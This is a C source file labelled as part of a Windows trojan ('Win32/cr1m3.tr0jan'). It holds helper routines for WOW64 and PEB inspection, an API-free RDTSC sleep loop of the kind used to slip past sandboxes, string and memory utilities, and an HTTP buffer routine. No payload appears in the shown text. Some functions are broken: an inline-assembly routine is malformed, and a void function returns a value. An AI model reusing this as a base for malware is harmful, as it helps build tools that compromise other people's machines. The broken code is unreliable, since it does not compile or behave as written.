/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#include "windows.h"
#include "api.h"
#include "misc.h"


unsigned short __misc_is_wOw64(void) {
	unsigned short ret = 0;
	__asm {
		xor eax, eax
		mov eax, fs:[0xC0]
		cmp al, 0 
		je is32
		mov ret, ax
		
	is32 :
	}

	return(ret);
}

unsigned long __misc_imagebase(void) {
	void *ret;

	__asm {
		mov eax, fs:[0x30]
		mov eax, [eax+0x08]
		mov eax, eax
		mov ret, eax
	}

	return(ret);
}

int __misc_getoffset_int(void *base, int offset) {
	int *ptr;
	char *add = (char *)base;
	add += offset;
	ptr = (int *)add;
	return(*ptr);
}


void *__misc_getoffset_ptr(void *base, int offset) {
	void *ptr;
	char *add = (char *)base;
	add += offset;
	ptr = (void *)add;
	return(ptr);
}




/**
 * @brief Sleep without API (no is precise)
 * @param second The seconds to sleep
 * @returns seconds
 *			0 error
**/
int __time_sleep(unsigned int seconds) {
	int i = 0;

	for(i=0;i<=((int)seconds/3)+1;i++) {
		__asm {
			RDTSC
			mov esi, edx
			inc esi
		time_now:
			RDTSC
			cmp esi, edx
			jge time_now
		}
	}

	return i;
}

int __wait_min(int minutes) {
	int i = 0;

	for (i = 0; i <= minutes; i++)
		__time_sleep(60);

	return(0);
}

/**
 * @brief Detect if string contain char 
 * @param str The string for find
 * @param chr The char find in string
 * @returns 1 success
 *			0 error
**/
int __str_is_chr(char *str, char chr) {
	int i = 0;

	while(str[i]!=0) {
		if(str[i]==chr)
			return 1;

		i++;
	}

	return 0;
}

/**
 * @brief Get string length
 * @param buff string for caculate length
 * @returns length of string
**/
int __strlen(char *buff) {
	int i=0;
	while(buff[i]!=0)
		i++;

	return(i);
}


/**
 * @brief Copy string 
 * @param dst destination string
 * @param src source string
 * @returns number of bytes copied
**/
int __strcpy(char *dst, char *src) {
	int i = 0;

	while(src[i]!='\0') {
		dst[i] = src[i];
		i++;
	}
	

	return(i);
}

/**
 * @brief Copy string with limit
 * @param dst destination string
 * @param src source string
 * @returns number of bytes copied
**/
int __strncpy(char *dst, char *src, int max) {
	int i =0;

	while(src[i]!='\0' && i!=max) {
		dst[i] = src[i];
		i++;
	}
	

	return(i);
}


/**
 * @brief Copy memory
 * @param dst destination memory space
 * @param src source memory space
 * @returns 0
**/
int __memcpy(unsigned char *dst, unsigned char *src, int max) {
	int i = 0;

	for(i=0;i<max;i++) {
		dst[i] = src[i];
	}

	return 0;
}

/**
 * @brief return bytes count to end of line
 * @param buff input string return end of line
 * @returns 0 if error
 *          number bytes to end of line
 */
int __get_end_of_line(const char *buff) {
	int i =0;
	while(buff[i]!=0) {
		if(buff[i]=='\n') {
			return(i);
		}

		i++;
	}

	return(0);
}


/**
 * @brief Get last char with delimiter from input string
 * @param buff input string
 * @param delimiter this is a delimiter 
 * @returns 0 if error
 *          number of bytes
 */
int __get_last_char(const char *buff, char delimiter) {
	int i = 0, b = 0;

	while(buff[i]!=0) {
		if(buff[i]==delimiter)
			b=i;

		i++;
	}


	return(b);
}




/**
 * @brief Get point to last char with delimiter from input string
 * @param buff input string
 * @param delimiter this is a delimiter 
 * @returns 0 if error
 *          pointer to last char delimiter from string
 */
char * __get_last_char_pointer(char *buff, char delimiter) {
	int i = 0, b = 0;


	while(buff[i]!=0) {
		if(buff[i]==delimiter)
			b=i;

		i++;
	}

	return(buff+b+1);
}



/**
 * @brief Split string by delimiter 
 * @param s input string for find
 * @param delim delimiter to search
 * @returns 0 if error
 *          pointer to first delimiter of string
 */
// Copyright (c) 1999 Apple Computer, Inc. All rights reserved.
// Thank you Apple
char *__strtok(char *s, const char *delim) {
	char *spanp;
	int c, sc;
	char *tok;
	static char *last;


	if (s == NULL && (s = last) == NULL)
		return (NULL);

	/*
	 * Skip (span) leading delimiters (s += strspn(s, delim), sort of).
	 */
cont:
	c = *s++;
	for (spanp = (char *)delim; (sc = *spanp++) != 0;) {
		if (c == sc)
			goto cont;
	}

	if (c == 0) {		/* no non-delimiter characters */
		last = NULL;
		return (NULL);
	}
	tok = s - 1;

	/*
	 * Scan token (scan for delimiters: s += strcspn(s, delim), sort of).
	 * Note that delim must have one NUL; we stop if we see that, too.
	 */
	for (;;) {
		c = *s++;
		spanp = (char *)delim;
		do {
			if ((sc = *spanp++) == c) {
				if (c == 0)
					s = NULL;
				else
					s[-1] = 0;
				last = s;
				return (tok);
			}
		} while (sc != 0);
	}
	/* NOTREACHED */
}


/*
 * @brief Trim string, clean \r \n 
 * @param buff input string to trim
 * @returns number of byte in string
 */
int __trim(unsigned char *buff) {
	int i = 0;

	while(buff[i]!='\0') {
		if(buff[i] == '\r' || buff[i]=='\n')
			buff[i]='\0';

		i++;
	}

	return(i);
}


/*
 * @brief Realign array one byte to left for HTTP receive data
 * @param buff input string for realing
 * @returns avoid return
 */
int __realign_array_left(char *buff) {
	int i = 0;

	while(buff[i]!='\0') {
		buff[i]=buff[i+1];
		i++;
	}

	return 0;
}



/*
 * @brief Convert int to ascii (or string (char array (consecutive bytes memory space))
 * @param value int value to convert
 * @param result output string with value
 * @param base numeric system (10 decimal, 6 hexadecimal, 8 octal)
 * @returns avoid returu
 */
// Copyright (c) 1999 Apple Computer, Inc. All rights reserved.
// Thank you Apple
char* itoa(int value, char* result, int base) {
	
        char* ptr = result, *ptr1 = result, tmp_char;
        int tmp_value;
	// check that the base if valid
        if (base < 2 || base > 36) { *result = '\0'; return result; }


        do {
                tmp_value = value;
                value /= base;
                *ptr++ = "zyxwvutsrqponmlkjihgfedcba9876543210123456789abcdefghijklmnopqrstuvwxyz" [35 + (tmp_value - value * base)];
        } while ( value );

        // Apply negative sign
        if (tmp_value < 0) *ptr++ = '-';
        *ptr-- = '\0';
        while(ptr1 < ptr) {
                tmp_char = *ptr;
                *ptr--= *ptr1;
                *ptr1++ = tmp_char;
        }
        return result;
}





int __atoi(char *str)
{
	int number = 0;
    char* p = str;

    if(!str)
		return -1;
    
    
    while((*p >= '0') && (*p <= '9'))
    {
        number = number * 10 + (*p - '0');
        p++;
    } 

    return number;
}



unsigned long int __getNTSTATUS(unsigned long int val) {

#if defined(_MSC_VER)
	#ifdef _W64
		__asm {
			lea rbx, val
			mov eax, ebx
	#else
		__asm {
			lea ebx, val
			mov eax, ebx
		}
	#endif
#else
	#ifdef _W64
		__asm(	"lea %1, %ebx"			: "=m" ((*(unsigned long *)val)));
		__asm(	"movl %ebx, %eax"		: "=r" (val));
	#else
		__asm(	"lea %1, %rbx"			: "=m" ((*(unsigned long *)val)));
		__asm(	"movl %ebx, %eax"		: "=r" (val));
	#endif				

#endif

	return(val);
}



void * __alloc(unsigned long len) {
	return(_HeapAlloc(_GetProcessHeap(), 0x00000008, len));
}

void __free(void *mem) {
	return(_HeapFree(_GetProcessHeap(), 0, mem));
}
